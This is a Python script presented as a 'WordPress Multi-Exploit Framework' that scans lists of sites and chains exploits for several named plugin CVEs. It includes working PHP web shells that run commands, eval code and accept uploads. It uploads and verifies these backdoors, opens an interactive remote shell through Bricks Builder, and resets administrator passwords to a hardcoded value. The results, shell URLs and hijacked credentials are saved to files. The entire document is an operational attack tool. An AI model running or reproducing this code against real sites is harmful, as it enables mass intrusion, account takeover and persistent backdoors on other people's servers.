#!/usr/bin/env python3
import requests
import re
import time
import os
import sys
import json
import random
import base64
import threading
import argparse
from datetime import datetime
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory

# Color setup
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

color = Console()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variables
SHELL_PASSWORD = "K3ysTr0K3R_2024"
SUCCESSFUL_EXPLOITS = []
FAILED_EXPLOITS = []

# Powerful PHP Shell
POWERFUL_SHELL = f"""<?php
$p = "{SHELL_PASSWORD}";
if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
    if(isset($_REQUEST['cmd'])){{
        $c = base64_decode($_REQUEST['cmd']);
        if(function_exists('system')){{ system($c); }}
        elseif(function_exists('exec')){{ exec($c,$o); echo implode("\\n",$o); }}
        elseif(function_exists('shell_exec')){{ echo shell_exec($c); }}
        elseif(function_exists('passthru')){{ passthru($c); }}
        die;
    }}
    if(isset($_FILES['f'])){{
        move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
        echo "Uploaded: " . $_FILES['f']['name'];
        die;
    }}
    if(isset($_POST['code'])){{
        eval(base64_decode($_POST['code']));
        die;
    }}
    if(isset($_REQUEST['info'])){{
        phpinfo();
        die;
    }}
    echo "Shell Active";
}}
?>"""

# Simple shell for initial upload
SIMPLE_SHELL = f"""<?php
$p="{SHELL_PASSWORD}";
if(isset($_REQUEST['p'])&&$_REQUEST['p']===$p){{
    if(isset($_REQUEST['cmd'])){{ system(base64_decode($_REQUEST['cmd'])); die; }}
    if(isset($_FILES['f'])){{ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }}
    if(isset($_POST['code'])){{ eval(base64_decode($_POST['code'])); die; }}
    echo "Shell Active";
}}
?>"""

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36"
}

# Bricks Builder paths
BRICKS_PATHS = [
    "/wp-json/bricks/v1/render_element",
    "/?rest_route=/bricks/v1/render_element"
]

class WordPressExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def verify_shell(self, url, retries=3):
        """Verify if shell is working with actual command execution"""
        for attempt in range(retries):
            try:
                test_cmd = base64.b64encode(b'echo SHELL_TEST_12345').decode()
                test_url = f"{url}?p={SHELL_PASSWORD}&cmd={test_cmd}"
                
                resp = self.session.get(test_url, timeout=10, allow_redirects=False)
                
                if resp.status_code == 200:
                    try:
                        decoded = base64.b64decode(resp.text).decode('utf-8', errors='ignore')
                        if 'SHELL_TEST_12345' in decoded:
                            return True
                    except:
                        if 'SHELL_TEST_12345' in resp.text or 'Shell Active' in resp.text:
                            return True
                
                resp2 = self.session.get(f"{url}?p={SHELL_PASSWORD}", timeout=10)
                if resp2.status_code == 200:
                    if 'Shell Active' in resp2.text or 'Enhanced Web Shell' in resp2.text:
                        return True
                        
                time.sleep(1)
            except:
                continue
        
        return False
    
    def fetch_bricks_nonce(self, target):
        """Fetch nonce for Bricks Builder exploit"""
        try:
            response = self.session.get(target, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, "html.parser")
            script_tag = soup.find("script", id="bricks-scripts-js-extra")
            if script_tag:
                match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string)
                if match:
                    return match.group(1)
            return None
        except Exception:
            return None
    
    def create_bricks_element(self, nonce, command=None):
        """Create element for Bricks Builder exploit"""
        if command:
            return {
                "postId": "1",
                "nonce": nonce,
                "element": {
                    "name": "code",
                    "settings": {
                        "executeCode": "true",
                        "code": f"<?php throw new Exception(`{command}`);?>"
                    }
                }
            }
        else:
            return {
                "postId": "1",
                "nonce": nonce,
                "element": {
                    "name": "container",
                    "settings": {
                        "hasLoop": "true",
                        "query": {
                            "useQueryEditor": True,
                            "queryEditor": "throw new Exception(`echo SHELL_TEST_12345`);",
                            "objectType": "post"
                        }
                    }
                }
            }
    
    def exploit_bricks_builder(self, target_url):
        """CVE-2024-25600 - Bricks Builder RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting Bricks Builder (CVE-2024-25600)...")
        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
        
        nonce = self.fetch_bricks_nonce(target_url)
        if not nonce:
            print(f"    {RED}[-]{RESET} Could not fetch nonce")
            return False, None
        
        print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
        
        # Test vulnerability
        test_element = self.create_bricks_element(nonce)
        
        for path in BRICKS_PATHS:
            test_url = target_url + path
            print(f"    {CYAN}[*]{RESET} Testing endpoint: {test_url}")
            
            try:
                resp = self.session.post(test_url, json=test_element, timeout=10)
                
                if resp.status_code == 200 and 'SHELL_TEST_12345' in resp.text:
                    print(f"    {GREEN}[✓]{RESET} Target is vulnerable!")
                    
                    # Try to upload shell
                    shell_name = f"shell_{random.randint(1000,9999)}.php"
                    encoded_shell = base64.b64encode(SIMPLE_SHELL.encode()).decode()
                    create_cmd = f"echo '{encoded_shell}' | base64 -d > {shell_name}"
                    
                    cmd_element = self.create_bricks_element(nonce, create_cmd)
                    resp = self.session.post(test_url, json=cmd_element, timeout=10)
                    
                    if resp.status_code == 200:
                        shell_url = urljoin(target_url, shell_name)
                        print(f"    {CYAN}[*]{RESET} Verifying shell at: {shell_url}")
                        
                        if self.verify_shell(shell_url):
                            print(f"    {GREEN}[✓]{RESET} Shell uploaded and verified!")
                            print(f"    {GREEN}[→]{RESET} Shell URL: {shell_url}")
                            print(f"    {GREEN}[→]{RESET} Password: {SHELL_PASSWORD}")
                            return True, shell_url
                    
                    return False, None
            except Exception as e:
                print(f"    {RED}[-]{RESET} Error: {str(e)}")
                continue
        
        return False, None
    
    def exploit_cve_2023_32243(self, target_url):
        """CVE-2023-32243 - Essential Addons for Elementor Authentication Bypass"""
        print(f"  {CYAN}[*]{RESET} Exploiting CVE-2023-32243...")
        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
        
        clean_url = target_url.replace('http://', '').replace('https://', '')
        
        try:
            # Get username
            user = None
            
            # Try REST API
            rest_url = f'http://{clean_url}/wp-json/wp/v2/users'
            print(f"    {CYAN}[*]{RESET} Attempting to enumerate users via: {rest_url}")
            
            try:
                resp = self.session.get(rest_url, timeout=10)
                if '"slug":"' in resp.text:
                    users = re.findall('"slug":"(.*?)"', resp.text)
                    if users:
                        user = users[0]
                        print(f"    {GREEN}[+]{RESET} Username found via REST API: {user}")
            except:
                pass
            
            # Try sitemap if REST API failed
            if not user:
                sitemap_url = f'http://{clean_url}/author-sitemap.xml'
                print(f"    {CYAN}[*]{RESET} Trying sitemap: {sitemap_url}")
                
                try:
                    resp = self.session.get(sitemap_url, timeout=10)
                    if 'Sitemap' in resp.text:
                        users = re.findall('author/(.*?)/', resp.text)
                        if users:
                            user = users[0]
                            print(f"    {GREEN}[+]{RESET} Username found via sitemap: {user}")
                except:
                    pass
            
            if not user:
                print(f"    {RED}[-]{RESET} Could not find username")
                return False, None
            
            # Get nonce
            print(f"    {CYAN}[*]{RESET} Fetching nonce from: http://{clean_url}")
            response = self.session.get(f'http://{clean_url}', timeout=10).text
            nonce_match = re.findall('admin-ajax.php","nonce":"(.*?)"', response)
            if not nonce_match:
                print(f"    {RED}[-]{RESET} Could not find nonce")
                return False, None
            
            nonce = nonce_match[0]
            print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
            
            # Reset password
            ajax_url = f'http://{clean_url}/wp-admin/admin-ajax.php'
            print(f"    {CYAN}[*]{RESET} Sending password reset request to: {ajax_url}")
            
            payload = {
                "action": "login_or_register_user",
                "eael-resetpassword-submit": "true",
                "page_id": "124",
                "widget_id": "224",
                "eael-resetpassword-nonce": nonce,
                "eael-pass1": SHELL_PASSWORD,
                "eael-pass2": SHELL_PASSWORD,
                "rp_login": user
            }
            
            resp = self.session.post(ajax_url, data=payload, timeout=10)
            
            if 'success":true' in resp.text:
                login_url = f'http://{clean_url}/wp-login.php'
                print(f"    {GREEN}[✓]{RESET} Password reset successful!")
                print(f"    {GREEN}[→]{RESET} Login URL: {login_url}")
                print(f"    {GREEN}[→]{RESET} Username: {user}")
                print(f"    {GREEN}[→]{RESET} Password: {SHELL_PASSWORD}")
                
                result = f"Credentials: {user}:{SHELL_PASSWORD} | Login: {login_url}"
                return True, result
            else:
                print(f"    {RED}[-]{RESET} Password reset failed")
                return False, None
                
        except Exception as e:
            print(f"    {RED}[-]{RESET} Error: {str(e)}")
            return False, None
    
    def exploit_pix_woocommerce(self, target_url):
        """CVE-2026-3891 - Pix for WooCommerce RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting Pix for WooCommerce (CVE-2026-3891)...")
        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
        
        base_url = target_url.rstrip('/')
        
        try:
            # Get nonce
            ajax_url = f"{base_url}/wp-admin/admin-ajax.php"
            print(f"    {CYAN}[*]{RESET} Fetching nonce from: {ajax_url}")
            
            nonce_resp = self.session.post(
                ajax_url,
                data={"action": "lkn_pix_for_woocommerce_generate_nonce"},
                timeout=10
            )
            
            try:
                nonce_data = nonce_resp.json()
                nonce = nonce_data.get('data', {}).get('nonce')
                if not nonce:
                    print(f"    {RED}[-]{RESET} Failed to get nonce")
                    return False, None
                print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
            except:
                print(f"    {RED}[-]{RESET} Invalid nonce response")
                return False, None
            
            # Upload shell
            print(f"    {CYAN}[*]{RESET} Uploading shell...")
            
            files = {
                'certificate_crt_path': ('shell.php', SIMPLE_SHELL, 'application/x-php')
            }
            data = {
                'action': 'lkn_pix_for_woocommerce_c6_save_settings',
                '_ajax_nonce': nonce,
                'settings': json.dumps({'enabled': 'yes'})
            }
            
            resp = self.session.post(ajax_url, files=files, data=data, timeout=30)
            
            if resp.status_code == 200:
                shell_url = f"{base_url}/wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/shell.php"
                print(f"    {CYAN}[*]{RESET} Verifying shell at: {shell_url}")
                
                if self.verify_shell(shell_url):
                    print(f"    {GREEN}[✓]{RESET} Shell verified and working!")
                    print(f"    {GREEN}[→]{RESET} Shell URL: {shell_url}")
                    print(f"    {GREEN}[→]{RESET} Password: {SHELL_PASSWORD}")
                    return True, shell_url
                else:
                    print(f"    {RED}[-]{RESET} Shell verification failed")
            
            return False, None
        except Exception as e:
            print(f"    {RED}[-]{RESET} Error: {str(e)}")
            return False, None
    
    def exploit_mpmf_rce(self, target_url):
        """CVE-2024-50526 - MPMF RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting MPMF RCE (CVE-2024-50526)...")
        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
        
        base_url = target_url.rstrip('/')
        
        # Detect form name
        form_names = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload']
        detected_form = None
        
        print(f"    {CYAN}[*]{RESET} Detecting form name...")
        
        for fname in form_names:
            test_url = f"{base_url}/?form_name={fname}"
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200 and 'mpmf' in resp.text.lower():
                    detected_form = fname
                    print(f"    {GREEN}[+]{RESET} Detected form: {detected_form}")
                    break
            except:
                continue
        
        if not detected_form:
            print(f"    {RED}[-]{RESET} Could not detect form name")
            return False, None
        
        # Upload shell
        upload_url = f"{base_url}/mpmf-1/"
        print(f"    {CYAN}[*]{RESET} Uploading shell to: {upload_url}")
        
        files = {
            'file1': ('shell.php', SIMPLE_SHELL, 'application/x-php')
        }
        data = {
            'form_name': detected_form,
            'mpmf_form_id': '1',
            'custom_form_action': 'send_data',
            'send': 'Submit'
        }
        
        try:
            resp = self.session.post(upload_url, files=files, data=data, timeout=30)
            
            if resp.status_code == 200:
                test_paths = [
                    f"{base_url}/wp-content/uploads/mpmf_uploads/shell.php",
                    f"{base_url}/wp-content/uploads/shell.php",
                    f"{base_url}/uploads/mpmf_uploads/shell.php",
                ]
                
                for test_url in test_paths:
                    print(f"    {CYAN}[*]{RESET} Checking: {test_url}")
                    if self.verify_shell(test_url):
                        print(f"    {GREEN}[✓]{RESET} Shell verified and working!")
                        print(f"    {GREEN}[→]{RESET} Shell URL: {test_url}")
                        return True, test_url
            
            return False, None
        except Exception as e:
            print(f"    {RED}[-]{RESET} Error: {str(e)}")
            return False, None
    
    def exploit_woocommerce_upload(self, target_url):
        """CVE-2024-51793 - WooCommerce Upload RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting WooCommerce Upload (CVE-2024-51793)...")
        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
        
        ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
        print(f"    {CYAN}[*]{RESET} Using AJAX endpoint: {ajax_url}")
        
        files = {
            'file': ('shell.php', SIMPLE_SHELL, 'image/jpeg')
        }
        data = {
            'action': 'wc_upload_file_ajax'
        }
        
        try:
            resp = self.session.post(ajax_url, files=files, data=data, timeout=30)
            
            if resp.status_code == 200:
                url_match = re.search(r'(https?://[^\s\'"<>]+\.php)', resp.text)
                if url_match:
                    shell_url = url_match.group(1)
                    print(f"    {CYAN}[*]{RESET} Verifying shell at: {shell_url}")
                    
                    if self.verify_shell(shell_url):
                        print(f"    {GREEN}[✓]{RESET} Shell verified and working!")
                        print(f"    {GREEN}[→]{RESET} Shell URL: {shell_url}")
                        return True, shell_url
            
            return False, None
        except Exception as e:
            print(f"    {RED}[-]{RESET} Error: {str(e)}")
            return False, None
    
    def exploit_wp_file_manager(self, target_url):
        """CVE-2020-25213 - WP File Manager RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting WP File Manager (CVE-2020-25213)...")
        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
        
        connector_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
        print(f"    {CYAN}[*]{RESET} Connector URL: {connector_url}")
        
        try:
            # Check if vulnerable
            check_resp = self.session.get(connector_url, timeout=5)
            if check_resp.status_code != 200:
                print(f"    {RED}[-]{RESET} Connector not accessible")
                return False, None
            
            print(f"    {GREEN}[+]{RESET} Connector is accessible")
            
            # Upload shell
            shell_name = f"shell_{random.randint(1000,9999)}.php"
            print(f"    {CYAN}[*]{RESET} Uploading shell: {shell_name}")
            
            files = {
                'upload[]': (shell_name, SIMPLE_SHELL, 'application/x-php')
            }
            data = {
                'reqid': str(random.randint(10000,99999)),
                'cmd': 'upload',
                'target': 'l1_Lw'
            }
            
            resp = self.session.post(connector_url, files=files, data=data, timeout=30)
            
            if resp.status_code == 200:
                shell_url = urljoin(target_url, f'wp-content/plugins/wp-file-manager/lib/files/{shell_name}')
                print(f"    {CYAN}[*]{RESET} Verifying shell at: {shell_url}")
                
                if self.verify_shell(shell_url):
                    print(f"    {GREEN}[✓]{RESET} Shell verified and working!")
                    print(f"    {GREEN}[→]{RESET} Shell URL: {shell_url}")
                    return True, shell_url
            
            return False, None
        except Exception as e:
            print(f"    {RED}[-]{RESET} Error: {str(e)}")
            return False, None
    
    def interactive_bricks_shell(self, target_url, nonce):
        """Interactive shell for Bricks Builder"""
        print(f"\n  {GREEN}[+]{RESET} Entering interactive shell mode...")
        print(f"  {YELLOW}[!]{RESET} Type 'exit' to quit\n")
        
        session = PromptSession(history=InMemoryHistory())
        
        while True:
            try:
                command = session.prompt(
                    HTML("<ansired><b>BricksShell> </b></ansired>"),
                    auto_suggest=AutoSuggestFromHistory(),
                )
                if command.lower() == "exit":
                    break
                
                for path in BRICKS_PATHS:
                    try:
                        element = self.create_bricks_element(nonce, command)
                        response = self.session.post(target_url + path, json=element, timeout=10)
                        output = response.json().get('data', {}).get('html', '')
                        cleaned_output = output.replace("Exception: ", "")
                        if cleaned_output:
                            print(cleaned_output)
                            break
                    except:
                        continue
            except KeyboardInterrupt:
                break
    
    def run_all_exploits(self, target_url):
        """Run all exploits and track results"""
        print(f"\n{'='*80}")
        print(f"{YELLOW}[*]{RESET} Testing exploits on: {GREEN}{target_url}{RESET}")
        print(f"{'='*80}")
        
        exploit_results = {
            'url': target_url,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'successful_exploits': [],
            'failed_exploits': []
        }
        
        # Try Bricks Builder first
        print(f"\n  {BLUE}[▶]{RESET} Trying Bricks Builder (CVE-2024-25600)...")
        nonce = self.fetch_bricks_nonce(target_url)
        if nonce:
            test_element = self.create_bricks_element(nonce)
            for path in BRICKS_PATHS:
                try:
                    resp = self.session.post(target_url + path, json=test_element, timeout=10)
                    if resp.status_code == 200 and 'SHELL_TEST_12345' in resp.text:
                        print(f"  {GREEN}[✓]{RESET} Bricks Builder is vulnerable!")
                        exploit_results['successful_exploits'].append({
                            'exploit': 'CVE-2024-25600 - Bricks Builder RCE',
                            'result': 'Interactive shell access'
                        })
                        self.interactive_bricks_shell(target_url, nonce)
                        return exploit_results
                except:
                    continue
        
        # Try other exploits
        exploits = [
            ('CVE-2023-32243 - Essential Addons Auth Bypass', self.exploit_cve_2023_32243),
            ('CVE-2026-3891 - Pix for WooCommerce RCE', self.exploit_pix_woocommerce),
            ('CVE-2024-50526 - MPMF RCE', self.exploit_mpmf_rce),
            ('CVE-2024-51793 - WooCommerce Upload RCE', self.exploit_woocommerce_upload),
            ('CVE-2020-25213 - WP File Manager RCE', self.exploit_wp_file_manager),
        ]
        
        for exploit_name, exploit_func in exploits:
            print(f"\n  {BLUE}[▶]{RESET} Trying {exploit_name}...")
            try:
                success, result = exploit_func(target_url)
                
                if success:
                    print(f"\n  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                    print(f"  {GREEN}[✓] SUCCESS!{RESET} {exploit_name}")
                    print(f"  {GREEN}[✓] Result:{RESET} {result}")
                    print(f"  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                    
                    exploit_results['successful_exploits'].append({
                        'exploit': exploit_name,
                        'result': result
                    })
                else:
                    print(f"  {RED}[✗] FAILED{RESET} {exploit_name}")
                    exploit_results['failed_exploits'].append(exploit_name)
                    
            except Exception as e:
                print(f"  {RED}[✗] ERROR{RESET} {exploit_name}: {str(e)}")
                exploit_results['failed_exploits'].append(f"{exploit_name} (Error: {str(e)})")
        
        return exploit_results

def save_results(all_results, output_file=None):
    """Save all results to files"""
    if not output_file:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"exploit_results_{timestamp}.txt"
    
    # Save detailed results
    with open(output_file, 'w') as f:
        f.write("="*80 + "\n")
        f.write("WORDPRESS EXPLOIT FRAMEWORK - RESULTS\n")
        f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Default Password: {SHELL_PASSWORD}\n")
        f.write("="*80 + "\n\n")
        
        successful_total = 0
        for result in all_results:
            if result['successful_exploits']:
                successful_total += 1
                f.write(f"\n{'='*80}\n")
                f.write(f"TARGET: {result['url']}\n")
                f.write(f"Time: {result['timestamp']}\n")
                f.write(f"{'='*80}\n")
                
                f.write("\n[SUCCESSFUL EXPLOITS]\n")
                for exploit in result['successful_exploits']:
                    f.write(f"  ✓ {exploit['exploit']}\n")
                    f.write(f"    Result: {exploit['result']}\n")
                    f.write(f"    Password: {SHELL_PASSWORD}\n\n")
                
                if result['failed_exploits']:
                    f.write("\n[FAILED EXPLOITS]\n")
                    for exploit in result['failed_exploits']:
                        f.write(f"  ✗ {exploit}\n")
        
        f.write(f"\n{'='*80}\n")
        f.write(f"SUMMARY\n")
        f.write(f"{'='*80}\n")
        f.write(f"Total Targets Scanned: {len(all_results)}\n")
        f.write(f"Successfully Exploited: {successful_total}\n")
        f.write(f"Failed: {len(all_results) - successful_total}\n")
    
    # Save simplified results for quick reference
    quick_file = output_file.replace('.txt', '_quick.txt')
    with open(quick_file, 'w') as f:
        f.write("# Quick Reference - Successful Exploits\n")
        f.write(f"# Password: {SHELL_PASSWORD}\n\n")
        
        for result in all_results:
            if result['successful_exploits']:
                f.write(f"\nURL: {result['url']}\n")
                for exploit in result['successful_exploits']:
                    if 'Shell URL' in str(exploit['result']):
                        f.write(f"Shell: {exploit['result']}\n")
                    elif 'Credentials' in str(exploit['result']):
                        f.write(f"Credentials: {exploit['result']}\n")
                    else:
                        f.write(f"Result: {exploit['result']}\n")
                f.write("-"*50 + "\n")
    
    # Save shells only
    shells_file = output_file.replace('.txt', '_shells.txt')
    with open(shells_file, 'w') as f:
        f.write("# Uploaded Shells\n")
        f.write(f"# Password: {SHELL_PASSWORD}\n\n")
        
        for result in all_results:
            for exploit in result['successful_exploits']:
                if 'Shell URL:' in str(exploit['result']) or 'http' in str(exploit['result']):
                    if 'http' in str(exploit['result']):
                        urls = re.findall(r'https?://[^\s]+', str(exploit['result']))
                        for url in urls:
                            f.write(f"{url}?p={SHELL_PASSWORD}\n")
    
    return output_file, quick_file, shells_file

def display_results_table(all_results):
    """Display results in a nice table format"""
    table = Table(title="Exploit Results", style="cyan")
    table.add_column("#", style="bold yellow")
    table.add_column("Target URL", style="bold green")
    table.add_column("Successful Exploits", style="bold green")
    table.add_column("Details", style="bold white")
    
    successful_count = 0
    for idx, result in enumerate(all_results, 1):
        if result['successful_exploits']:
            successful_count += 1
            details = []
            for exploit in result['successful_exploits']:
                if 'Shell URL' in str(exploit['result']):
                    details.append("Shell Uploaded")
                elif 'Credentials' in str(exploit['result']):
                    details.append("Credentials Obtained")
                else:
                    details.append("Exploited")
            
            table.add_row(
                str(idx),
                result['url'][:50],
                str(len(result['successful_exploits'])),
                ", ".join(details)
            )
    
    color.print(table)
    return successful_count

def ascii_art():
    color.print("""[yellow]
   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    [/yellow]""", style="bold")
    print(f"{BOLD}{CYAN}Coded By: K3ysTr0K3R & Enhanced Team{RESET}")
    print(f"{BOLD}{WHITE}Exploits: CVE-2024-25600 | CVE-2023-32243 | CVE-2026-3891 | CVE-2024-50526 | CVE-2024-51793 | CVE-2020-25213{RESET}")
    print(f"{BOLD}{YELLOW}Default Shell Password: {SHELL_PASSWORD}{RESET}")
    print("")

def scan_file(target_file, threads):
    with open(target_file, "r") as url_file:
        urls = [url.strip() for url in url_file if url.strip()]
        if not urls:
            color.print("[bold bright_red][~][/bold bright_red] No URLs found in the file.")
            return
    
    exploiter = WordPressExploiter()
    all_results = []
    total = len(urls)
    completed = 0
    
    print(f"\n[bold bright_blue][*][/bold bright_blue] Loading targets from: {target_file}")
    print(f"[bold bright_blue][*][/bold bright_blue] Total targets: {total}")
    print(f"[bold bright_blue][*][/bold bright_blue] Threads: {threads}")
    print(f"[bold bright_blue][*][/bold bright_blue] Default password: {SHELL_PASSWORD}\n")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
    ) as progress:
        task = progress.add_task("[cyan]Scanning targets...", total=total)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(exploiter.run_all_exploits, url): url for url in urls}
            
            for future in as_completed(futures):
                url = futures[future]
                completed += 1
                try:
                    result = future.result(timeout=300)
                    all_results.append(result)
                    
                    if result['successful_exploits']:
                        color.print(f"\n[bold bright_green][✓][/bold bright_green] [{completed}/{total}] SUCCESS: {url}")
                        for exploit in result['successful_exploits']:
                            color.print(f"    [green]→[/green] {exploit['exploit']}")
                    else:
                        color.print(f"\n[bold bright_red][✗][/bold bright_red] [{completed}/{total}] FAILED: {url}")
                        
                except Exception as e:
                    color.print(f"\n[bold bright_red][✗][/bold bright_red] [{completed}/{total}] ERROR: {url} - {str(e)}")
                    all_results.append({
                        'url': url,
                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'successful_exploits': [],
                        'failed_exploits': ['Error: ' + str(e)]
                    })
                
                progress.update(task, advance=1)
    
    # Display summary
    print(f"\n{'='*80}")
    successful_count = display_results_table(all_results)
    
    # Save results
    if all_results:
        output_file, quick_file, shells_file = save_results(all_results)
        print(f"\n[bold bright_green][✓][/bold bright_green] Results saved to:")
        print(f"    📄 Detailed: {output_file}")
        print(f"    📄 Quick ref: {quick_file}")
        print(f"    📄 Shells only: {shells_file}")
    
    print(f"\n[bold bright_yellow][!][/bold bright_yellow] Summary:")
    print(f"    Total targets: {total}")
    print(f"    Successfully exploited: {successful_count}")
    print(f"    Failed: {total - successful_count}")
    print(f"    Success rate: {(successful_count/total)*100:.1f}%")

def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    ascii_art()
    
    parser = argparse.ArgumentParser(description='WordPress Multi-Exploit Framework - Complete Edition')
    parser.add_argument('-u', '--url', help='Single target URL to exploit')
    parser.add_argument('-f', '--file', help='File containing URLs to scan (one per line)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads for scanning (default: 10)')
    parser.add_argument('-o', '--output', help='Custom output file name (default: auto-generated)')
    
    args = parser.parse_args()
    
    if args.url:
        # Single target mode
        exploiter = WordPressExploiter()
        result = exploiter.run_all_exploits(args.url)
        
        if result['successful_exploits']:
            print(f"\n{GREEN}{'='*80}{RESET}")
            print(f"{GREEN}[✓] EXPLOITATION COMPLETE{RESET}")
            print(f"{GREEN}{'='*80}{RESET}")
            for exploit in result['successful_exploits']:
                print(f"\n{GREEN}Exploit:{RESET} {exploit['exploit']}")
                print(f"{GREEN}Result:{RESET} {exploit['result']}")
                print(f"{GREEN}Password:{RESET} {SHELL_PASSWORD}")
            
            # Save single result
            save_results([result], args.output)
        else:
            print(f"\n{RED}[✗] No exploits succeeded on {args.url}{RESET}")
            
    elif args.file:
        # File mode
        if not os.path.exists(args.file):
            color.print(f"[bold bright_red][~][/bold bright_red] File not found: {args.file}")
            return
        scan_file(args.file, args.threads)
    else:
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        color.print("\n[bold bright_yellow][!][/bold bright_yellow] Interrupted by user")
    except Exception as e:
        color.print(f"\n[bold bright_red][!][/bold bright_red] Fatal error: {e}")
